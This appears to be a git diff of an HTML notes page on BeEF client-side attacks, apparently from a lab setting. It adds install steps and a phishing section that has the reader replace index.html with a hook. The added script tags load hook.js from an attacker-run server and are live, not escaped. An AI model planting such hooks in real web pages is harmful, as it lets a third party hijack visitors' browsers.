@@ -66,7 +66,7 @@
 <h3>Client Side Attacks.</h3>
     <h4>Beef Framework.</h4>
         <p>
-            Browser Exploitation Framework allowing us to launch a number of attacks
+            <b>Browser</b> Exploitation Framework allowing us to launch a number of attacks
             on a hooked target.
             <br />
             Targets are hooked once they load a hook url.
@@ -77,7 +77,7 @@
             <li>Use XSS Exploit</li>
             <li>Social engineer the target to open a hook page.</li>
         </ol>
-        Do the usual
+        <h4>Install BeEF</h4>
         <ol>
             <li>sudo apt update</li>
             <li>sudp apt upgrade</li>
@@ -85,6 +85,25 @@
             <li>In apps, navigate to Beef Start BeEF-xss, and click to start </li>
             <li>You will be prompted for a UN and a PW</li>
             <li>Navigate to <b>http://127.0.0.1:3000/ui/panel</b></li>
+        </ol>
+        <h4>Phishing for BeEF</h4>
+        <h5>DNS Spoof, Code Inject or Social Engineer to get JS hook in page</h5>
+        <p>First Example, for Kali Linux only</p>
+        <ol>
+            <li>Go to /var/www/html/ to open index.html</li>
+            <li>Make a backup of index.html, deleted all, insert the hook:
+                <br/>
+                <h4>This HTML file contains the BeEF Hook</h4>
+                Get your ip <b>ifconfig</b>
+                <br/>
+                <b><script src="http://[YOUR_IP]:3000/hook.js"></script></b>
+                <br/>
+                <script src="http://192.168.63.139:3000/hook.js"></script>
+                <br/>
+                That's the only code you need for this example.
+            </li>
+            <li>Start your websever: $ service apache2 start</li>
+            <li></li>
         </ol>
 
 
